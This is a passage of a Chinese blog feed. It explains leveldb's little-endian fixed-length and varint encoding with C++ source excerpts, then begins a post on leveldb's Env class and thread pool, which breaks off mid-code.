    <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>在阅读本篇文章前，你应该能先了解什么是字节序，什么是小端序，什么是大端序。 </p><a id="more"></a><h2 id="1-正文"><a href="#1-正文" class="headerlink" title="1. 正文"></a>1. 正文</h2><p>leveldb中与编码相关的内容都在coding.h，coding.cc文件中。leveldb的编码都是采用小端序，编码一共分为固定长度编码和变长编码，且都分为32位和64位版本，我们先说固定长度编码。</p><h2 id="2-固定长度编码"><a href="#2-固定长度编码" class="headerlink" title="2. 固定长度编码"></a>2. 固定长度编码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Lower-level versions of Put... that write directly into a character buffer</span></span><br><span class="line"><span class="comment">// REQUIRES: dst has enough space for the value being written</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">EncodeFixed32</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">buffer</span> = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(dst);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Recent clang and gcc optimize this to a single mov / str instruction.</span></span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">0</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">1</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">2</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">3</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">EncodeFixed64</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">buffer</span> = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(dst);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Recent clang and gcc optimize this to a single mov / str instruction.</span></span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">0</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">1</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">2</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">3</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">24</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">4</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">5</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">40</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">6</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">48</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">7</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">56</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一句话总结，低位字节放在低位内存，高位字节放在高位内存，也即小端序。</p><p>解码过程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Lower-level versions of Get... that read directly from a character buffer</span></span><br><span class="line"><span class="comment">// without any bounds checking.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">uint32_t</span> <span class="title">DecodeFixed32</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* ptr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">buffer</span> = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">uint8_t</span>*&gt;(ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Recent clang and gcc optimize this to a single mov / ldr instruction.</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">0</span>])) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">uint64_t</span> <span class="title">DecodeFixed64</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* ptr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">buffer</span> = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">uint8_t</span>*&gt;(ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Recent clang and gcc optimize this to a single mov / ldr instruction.</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">0</span>])) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">4</span>]) &lt;&lt; <span class="number">32</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">5</span>]) &lt;&lt; <span class="number">40</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">6</span>]) &lt;&lt; <span class="number">48</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">7</span>]) &lt;&lt; <span class="number">56</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按字节取即可。</p><h2 id="3-变长编码"><a href="#3-变长编码" class="headerlink" title="3. 变长编码"></a>3. 变长编码</h2><p>为什么需要变长编码？ 考虑一个场景，假设现在我们只用在存放一个int类型的1， 这么简单的一个数字，我们却需要4个字节（一般情况下），要是可以压缩就好了。变长编码就是用来解决这个问题的，使用变长编码后，只用一个字节就可以保存这个1. </p><p>leveldb的变长编码也是采用小端序，同时在一个字节中，低7位表示的是实际数据，最高的1位用来表示，这个字节后序是否还有字节用来表示数字。举个例子：</p><p>假设要表示数字1000。 其二进制是111 1101000。 </p><p>首先取出低7位：1101000， 高位先补0凑成一个字节， 0110 1000。</p><p>取出高3位： 111， 高位补0凑成一个字节， 0000 0111.</p><p>采用小端序存储这个数字： 0110 1000 0000 0111。</p><p>因为这里用到了两个字节表示一个数字，所以在第一个字节的最高位需要设置成1，表示第二个字节也是用来表示“1000（一千）”这个数字的。最终编码结果为：</p><p><strong>1110 1000 0000 0111.</strong></p><p>解码过程：</p><p>首先，读取第一个字节， 1110 1000， 最高位为1，表示后续还有字节表示这个数字，还原最高位位1后（0110 1000），再取一个字节（0000 0111）， 因为0000 0111最高不为1，所以取字节结束。现在得到两个字节：</p><p>01110 1000 0000 0111</p><p>按照小端序还原：</p><p><strong>0000 0111 0110 1000（二进制） ==&gt; 1000（十进制）</strong></p><p>知道了原理，来看代码吧。</p><p>变长编码函数签名：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Lower-level versions of Put... that write directly into a character buffer</span></span><br><span class="line"><span class="comment">// and return a pointer just past the last byte written.</span></span><br><span class="line"><span class="comment">// REQUIRES: dst has enough space for the value being written</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">EncodeVarint32</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint32_t</span> value)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">EncodeVarint64</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint64_t</span> value)</span></span>;</span><br></pre></td></tr></table></figure><p>实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">EncodeVarint32</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint32_t</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Operate on characters as unsigneds</span></span><br><span class="line">  <span class="keyword">uint8_t</span>* ptr = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(dst);</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> B = <span class="number">128</span>;</span><br><span class="line">  <span class="keyword">if</span> (v &lt; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>)) &#123;</span><br><span class="line">    *(ptr++) = v;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v &lt; (<span class="number">1</span> &lt;&lt; <span class="number">14</span>)) &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    *(ptr++) = v &gt;&gt; <span class="number">7</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v &lt; (<span class="number">1</span> &lt;&lt; <span class="number">21</span>)) &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">7</span>) | B;</span><br><span class="line">    *(ptr++) = v &gt;&gt; <span class="number">14</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v &lt; (<span class="number">1</span> &lt;&lt; <span class="number">28</span>)) &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">7</span>) | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">14</span>) | B;</span><br><span class="line">    *(ptr++) = v &gt;&gt; <span class="number">21</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">7</span>) | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">14</span>) | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">21</span>) | B;</span><br><span class="line">    *(ptr++) = v &gt;&gt; <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照前面讲的例子，这段代码不难理解，变量B用来设置一个字节的最高位，表示后续是否还有字节。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">EncodeVarint64</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint64_t</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> B = <span class="number">128</span>;</span><br><span class="line">  <span class="keyword">uint8_t</span>* ptr = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(dst);</span><br><span class="line">  <span class="keyword">while</span> (v &gt;= B) &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    v &gt;&gt;= <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(ptr++) = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(v);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>64位是32位的循环版本，两个代码表示同一个意思。</p><p>解码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Standard Get... routines parse a value from the beginning of a Slice</span></span><br><span class="line"><span class="comment">// and advance the slice past the parsed value.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetVarint32</span><span class="params">(Slice* input, <span class="keyword">uint32_t</span>* value)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetVarint64</span><span class="params">(Slice* input, <span class="keyword">uint64_t</span>* value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------最终会走到下面这个函数---------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">GetVarint32PtrFallback</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p, <span class="keyword">const</span> <span class="keyword">char</span>* limit,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">uint32_t</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">uint32_t</span> shift = <span class="number">0</span>; shift &lt;= <span class="number">28</span> &amp;&amp; p &lt; limit; shift += <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">byte</span> = *(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">uint8_t</span>*&gt;(p));</span><br><span class="line">    p++;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">byte</span> &amp; <span class="number">128</span>) &#123;<span class="comment">// 后续还有字节</span></span><br><span class="line">      <span class="comment">// More bytes are present</span></span><br><span class="line">      result |= ((<span class="keyword">byte</span> &amp; <span class="number">127</span>) &lt;&lt; shift);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 后续无字节，到了最后的字节</span></span><br><span class="line">      result |= (<span class="keyword">byte</span> &lt;&lt; shift);</span><br><span class="line">      *value = result;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(p);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了方便用户使用，leveldb还封住了一个Put函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PutVarint32</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>* dst, <span class="keyword">uint32_t</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">char</span>* ptr = EncodeVarint32(buf, v);</span><br><span class="line">  dst-&gt;append(buf, ptr - buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先申请了一个5字节的buf，用来存储编码后的结果。为什么是5个字节？因为当32位的数值过大，比如 0xffffffff， 那么变长编码肯定需要5个字节才能表示。后面就很简单那了，执行编码，将编码结果保存在dst中。</p><h2 id="4-PutLengthPrefixedSlice-amp-GetLengthPrefixedSlice"><a href="#4-PutLengthPrefixedSlice-amp-GetLengthPrefixedSlice" class="headerlink" title="4. PutLengthPrefixedSlice &amp; GetLengthPrefixedSlice"></a>4. PutLengthPrefixedSlice &amp; GetLengthPrefixedSlice</h2><p>Put函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PutLengthPrefixedSlice</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>* dst, <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">  PutVarint32(dst, value.<span class="built_in">size</span>());</span><br><span class="line">  dst-&gt;append(value.data(), value.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于一个字符串，这里首先将它的长度放到dst中，然后再将数值放入。 </p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcv57uY5Zu+5paH5Lu2LeesrA==" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第<i class="fa fa-external-link"></i></span> 20 页.png)</p><p>Get函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetLengthPrefixedSlice</span><span class="params">(Slice* input, Slice* result)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> len;</span><br><span class="line">  <span class="keyword">if</span> (GetVarint32(input, &amp;len) &amp;&amp; input-&gt;<span class="built_in">size</span>() &gt;= len) &#123;</span><br><span class="line">    *result = Slice(input-&gt;data(), len);</span><br><span class="line">    input-&gt;remove_prefix(len);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的意思相当于将编码后的string中的长度信息去除，提出出原始string。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>本文分析了leveldb中与编码相关的知识，包含了固定长度编码与变长编码的原理与实现。这些内容虽然看似与leveldb无关，但是leveldb内部存储中却无时无刻不用到这些编码，所以我们现在都是在为后续看懂leveldb做铺垫。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0-前言&quot;&gt;&lt;a href=&quot;#0-前言&quot; class=&quot;headerlink&quot; title=&quot;0. 前言&quot;&gt;&lt;/a&gt;0. 前言&lt;/h2&gt;&lt;p&gt;在阅读本篇文章前，你应该能先了解什么是字节序，什么是小端序，什么是大端序。 &lt;/p&gt;
    
    </summary>
    
    
      <category term="leveldb" scheme="https://www.ravenxrz.ink/categories/leveldb/"/>
    
    
  </entry>
  
  <entry>
    <title>leveldb源码阅读记录-Env类</title>
    <link href="https://www.ravenxrz.ink/archives/c451920b.html"/>
    <id>https://www.ravenxrz.ink/archives/c451920b.html</id>
    <published>2020-10-12T01:30:40.000Z</published>
    <updated>2020-10-12T02:38:34.245Z</updated>
    
    <content type="html"><![CDATA[<p>本系列的前几篇文章并不准备深入到leveldb中的”核心“，而是分析一些leveldb中用到的”杂项“内容，如本文要说的Env类，后面要提到的编码、文件命名方式等。</p><a id="more"></a><h2 id="Env"><a href="#Env" class="headerlink" title="Env"></a>Env</h2><p>Env代表Environment，环境类，在其内部封装了leveldb所有的文件操作和线程调度操作。Env是一个虚基类，具体操作由子类实现，看一下它的继承关系：</p><img data-src="https://pic.downk.cc/item/5f83a9d71cd1bbb86b971527.png" alt="image-20201012085159807" style="zoom: 50%;" /><p>EnvWrapper类主要是供用户自定义一些操作，一般不管，主要看Windows平台和PosixEnv（linux属于这个范围），因为我都是在linux平台上看的，所以这里只用关注PosixEnv。</p><h3 id="构造env"><a href="#构造env" class="headerlink" title="构造env"></a>构造env</h3><p>默认情况下，Env由<code>Env::Default()</code>函数调用创建：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">leveldb/util/env_posix.cc</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> PosixDefaultEnv = SingletonEnv&lt;PosixEnv&gt;;</span><br><span class="line"><span class="function">Env* <span class="title">Env::Default</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> PosixDefaultEnv env_container;</span><br><span class="line">  <span class="keyword">return</span> env_container.env();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Env* <span class="title">env</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Env*&gt;(&amp;env_storage_); &#125;</span><br></pre></td></tr></table></figure><p>Evn.Default调用<code>env_container.env();</code>,  env_container是PosixDefaultEnv类型（PosixDefaultEnv是SingletonEnv<PosixEnv>的别名), env返回<code>env_storage</code>.</p><p>关于env_storage，这个变量在SingletonEnv类中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用于字节对齐，这里表示env_storage_按照EnvType的大小对齐，同时自身的大小也是env_storage_</span></span><br><span class="line"><span class="keyword">typename</span> <span class="built_in">std</span>::aligned_storage&lt;<span class="keyword">sizeof</span>(EnvType), <span class="keyword">alignof</span>(EnvType)&gt;::type</span><br><span class="line">      env_storage_;</span><br><span class="line"></span><br><span class="line"><span class="comment">// env_storage_在PosixDefaultEnv的构造函数中被初始化：</span></span><br><span class="line"><span class="keyword">new</span> (&amp;env_storage_) EnvType();<span class="comment">// 这句话的意思是，按照EvnType的大小申请一个对象，然后将这个对象填充到env_storage_的地址空间中去。</span></span><br></pre></td></tr></table></figure><p>最后的默认环境为 <strong>PosixEnv类</strong>, 看一下它的类图：</p><img data-src="https://pic.downk.cc/item/5f633eec160a154a67e8687e.png" alt="image-20200916170716873" style="zoom: 50%;" /><p>可以看到都是一些辅助函数，包括文件创建，监测，线程管理（同步）等。文件的相关操作比较简单，我们说一下线程池的实现：</p><h3 id="线程池、队列"><a href="#线程池、队列" class="headerlink" title="线程池、队列"></a>线程池、队列</h3><p>线程池的实现中有一个工作队列，队列中放的都是需要被线程执行的任务。工作队列由<code>background_work_queue_</code>表示，任务则由<code>BackgroundWorkItem</code>表示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 队列</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">queue</span>&lt;BackgroundWorkItem&gt; background_work_queue_</span><br><span class="line">      GUARDED_BY(background_work_mutex_);</span><br><span class="line">      </span><br><span class="line"><span class="comment">// work item</span></span><br><span class="line"><span class="comment">// Stores the work item data in a Schedule() call.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Instances are constructed on the thread calling Schedule() and used on the</span></span><br><span class="line"><span class="comment">// background thread.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This structure is thread-safe beacuse it is immutable.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BackgroundWorkItem</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">BackgroundWorkItem</span><span class="params">(<span class="keyword">void</span> (*function)(<span class="keyword">void</span>* arg), <span class="keyword">void</span>* arg)</span></span></span><br><span class="line">        : function(function), arg(arg) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*<span class="keyword">const</span> function)(<span class="keyword">void</span>*);</span><br><span class="line">    <span class="keyword">void</span>* <span class="keyword">const</span> arg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如何调度一个线程？看Schedule函数，<em>目前看来线程池中只有一个线程</em>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PosixEnv::Schedule</span><span class="params">(</span></span></span><br><span class="line"><span 